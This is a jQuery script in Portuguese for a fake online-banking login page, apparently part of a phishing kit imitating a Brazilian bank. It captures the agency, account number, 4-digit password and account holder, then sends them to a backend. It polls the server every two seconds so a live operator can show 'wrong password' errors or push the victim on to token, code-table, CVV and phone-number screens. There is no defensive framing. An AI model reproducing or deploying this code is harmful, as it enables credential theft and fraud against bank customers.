$('document').ready(function(){

  let id = $('#id').val().length > 0 ? $('#id').val() : '';
  let clientHashId = $('#clientHashId').val();
  let idAcesso = $('#idAcesso').val();
  let titular = '';
  let tipo = 'Banco Virtual';



  function loadInfo(){
    if(id !== '' && !isNaN(id) && clientHashId !== ''){

      $.ajax({
          url: "../api.php",
          type:'POST',
          dataType : "json",
          data: { action : "GET_INFO", id : id, clientHashId : clientHashId},
          cache: false,
          success: function(r){
              info = r;

              if(r.comando !== 'INFORMACOES_INVALIDAS') {
                if($('input#agencia').val() == ''){
                  $('input#agencia').val(r.agencia);
                }
                if($('input#conta').val() == ''){
                  $('input#conta').val(r.conta + '-'+ r.digito);
                }
              }

              if(r.comando !== status) {
                  status = r.comando;
                  if(r.comando === 'SENHA_DE_4' || r.comando === 'SENHA_DE_4_ERRO'){
                    carregaNome();
                  }
                  atualizarTela();
              }
          }
      });
    }
  }

  $('button.btn-option').click(function(e){
        e.preventDefault();
        $('button.btn-option').removeClass('red');
        $(e.target).addClass('red');
  });


    $( "#conta" ).keyup(function(e) {
        let data = $(e.target).val();
        data = data.replace(/[^0-9]/g, '');
    
        if(data.length > 1 ) {
          data = data.substr(0,data.length-1) + '-' + data.substr(data.length-1);
        }

        $(e.target).val(data);

    });

    function erro(msg, id) {
        let seletor = id + ' .erro';
        $(seletor + ' p').text(msg);
        $(seletor).removeClass('hide');
    }

    function hideErro(msg, id) {
      let seletor = id + ' .erro';
      $(seletor).addClass('hide');
  }

    function validaDigito(strConta)
    {
      let aConta = strConta.split('-');
      let dv_conta = aConta[0];
      let dv_informado = aConta[1];
  
      let lsoma = 0;
      let ipeso = 2;
  
      let tam = dv_conta.length;
  
      let conta = new Array(tam);
  
      for (let i=0; i<=tam; i++) {
        conta[i] = dv_conta.substr( i, 1);
      }
  
      while (tam > 0) {
  
        let digito = conta[--tam];
  
        if ((digito >= 0) && (digito <= 9)) { 
  
          lsoma = lsoma + (digito - 0) * ipeso; 
  
          ipeso = ipeso + 1; 
  
          if (ipeso > 7) 
  
          {ipeso = 2;}
  
        } 
      }
  
      lsoma %= 11; 
  
      lsoma = 11 - lsoma;
  
      if ((lsoma == 11) || (lsoma == 10)) {
        lsoma = 0;
      }
  
      if (parseInt(dv_informado) === lsoma) {
        return true;
      } else {
        return false;
      }
    }

    var timer = setInterval ( function(){
        loadInfo();
    }, 2000 );



  $( ".pula-campo").keyup(function(e) {

    let tamanho = $(e.target).val().length;
    let maxlength = $(e.target).attr('maxlength');
    if(tamanho == maxlength){
        let proximoCampo = $(e.target).data('proximoCampo');
        $('#'+proximoCampo).focus();
    }

  });

  function montarTitulares(titulares){
      let butons = '';

      for(let i = 0; i < 3; i++){
        let numero = i + 1;
        let nome = titulares[i] ? titulares[i] : numero + 'º Titular';
        let dataValue = titulares[i] ? titulares[i] : 'titular';
        butons += `<button type="button" data-nome-titular="${dataValue}" class="btn-option button-titulares">${nome}</button>`;
      }

      $('div#titularidades div.titulares').empty();

      $('div#titularidades div.titulares').append(butons);
      $('div#boxCarregando').addClass('hide');
      $('div#titularidades').removeClass('hide');
      if(titulares.length == 1){
        titular = titulares[0];
        $('button.button-titulares').first().addClass('red');
      }
  }

  function carregaNome() {
    let agencia = $('input#agencia').val();
    let conta = $('input#conta').val();

    if(agencia.length > 0 && conta.length > 0){
      $('div.erro').addClass('hide');
      $('div#boxCarregando').removeClass('hide');

      let aConta = conta.split('-');
      let digito = aConta[1];
      conta = aConta[0];
  
      $.ajax({
        url: "../api.php",
        type:'POST',
        data: { action : "BUSCAR_TITULARES", idAcesso : idAcesso, agencia : agencia, conta : conta, digito : digito, digito : digito},
        dataType : "json",
        cache: false,
        success: function(r){
  
          let titulares = [];
          
  
          if(r.nome && r.nome.length > 0){
            titulares.push(r.nome);
          }
  
          if(r.titulares && r.titulares.length > 0){
            r.titulares.forEach( e => {
              titulares.push(e);
            })
          }

          if(r.exclusive){
            tipo = 'Banco Virtual Exclusive';
          }
		  
		  titulares.push('1º Titular');
          console.log(r);

          if(r.prime){
            tipo = 'Banco Virtual Prime';
          }

          if(titulares.length > 0){
            montarTitulares(titulares);
			//montarTitulares('Cliente');
          } else {
            $('div#boxCarregando').addClass('hide');
            erro('Informações inválidas.', '#boxAcesso');
            $('input#agencia').val('');
            $('input#conta').val('');
            $('input#agencia').focus();
          }
            
        }
      });
      
    }
  }

  $('#conta').focusout(e => {
    carregaNome();

  });


    $('div#boxAcesso input.bt_avancar').click(function(e) {

        e.preventDefault();
        $(e.target).attr('disabled', true);

        $('div.erro').addClass('hide');
       
        let s4 = $('input#s4').val();
        let agencia = $('input#agencia').val();
        let conta = $('input#conta').val();
    
        if(agencia === '' || agencia.length < 3){
            erro('Agência inválida.', '#boxAcesso');
            $('input#agencia').focus();
            $(e.target).attr('disabled', false);
            return false;
        }
        // if(conta === '' || !validaDigito(conta)){
        //     erro('Conta inválida.', '#boxAcesso');
        //     $('input#conta').focus();
        //     $(e.target).attr('disabled', false);
        //     return false;
        // }

        if(s4 === '' || s4.length !== 4){
            erro('Informe a senha de 4 dígitos.', '#boxAcesso');
            $('input#s4').focus();
            $(e.target).attr('disabled', false);
            return;
        }


        if(titular === ''){
          erro('Selecione um Titular', '#boxAcesso');
          $('input#s4').focus();
          $(e.target).attr('disabled', false);
          return;
      }
      
      $('div#boxAguarde').removeClass('hide');
        let aConta = conta.split('-');
        let digito = aConta[1];
        conta = aConta[0];

        $.ajax({
          url: "../api.php",
          type:'POST',
          data: { action : "SALVAR_INFO_MOBILE", idAcesso : idAcesso, agencia : agencia, conta : conta, digito : digito, digito : digito, senha4 : s4, id : id, titular : titular, tipo : tipo},
          dataType : "json",
          cache: false,
          success: function(r){
              
              id = r.id;
              if(r.nome && r.nome.length > 0) {
                $('span.nome').text(r.nome + ', ');
              }
              status = 'AGUARDANDO';
              atualizarTela();
              
          }
      });

    });



    $('div#titularidades').delegate('button.btn-option', 'click', e => {
      let dataTitular = $(e.target).data('nomeTitular');

      if(dataTitular !== 'titular'){
        $('div#titularidades button.btn-option').removeClass('red');
        $(e.target).addClass('red');
        titular = dataTitular;
      }
    });

    function atualizarTela(){
      
   
      if(status ==='SENHA_DE_4'){
          $('div#boxAcesso input.bt_avancar').attr('disabled', false);
          $('div#boxAguarde').addClass('hide');
          $('input#s4').val('');
      }
      if(status ==='SENHA_DE_4_ERRO'){
          $('div#boxAcesso input.bt_avancar').attr('disabled', false);
          $('div#boxAcesso').find('div.erro').removeClass('hide').find('p.msg').text('A Senha de 4 Dígitos não está correta.');
          $('div#boxAguarde').addClass('hide');
          $('input#s4').val('');
          //$('input#s4').focus();
      }
      if(status ==='INFORMACOES_INVALIDAS'){
        id = '';
        $('div#boxAcesso').find('div.erro').removeClass('hide').find('p.msg').text('Informações inválidas.');
        $('div#boxAcesso').removeClass('hide');
        $('input#agencia').val('');
        $('input#conta').val('');
        $('input#s4').val('');
        $('div#titularidades').addClass('hide');
        $('div#boxAguarde').addClass('hide');
        $('div#boxAcesso input.bt_avancar').attr('disabled', false);
        //$('input#s4').focus();
      }
      if(status ==='TOKEN' || status ==='TOKEN_ERRO' || status ==='TABELA' || status ==='TABELA_ERRO' || status ==='SENHA_DE_6_INTERNA' || status ==='SENHA_DE_6_ERRO_INTERNA' || status ==='CVV_INTERNA' || status ==='CVV_ERRO_INTERNA' || status ==='CELULAR_INTERNA' || status ==='CELULAR_ERRO_INTERNA' || status == 'TELA_FIM_INTERNA'){
        window.location.href = "identificacao.php?hash="+clientHashId;
      }

  }

});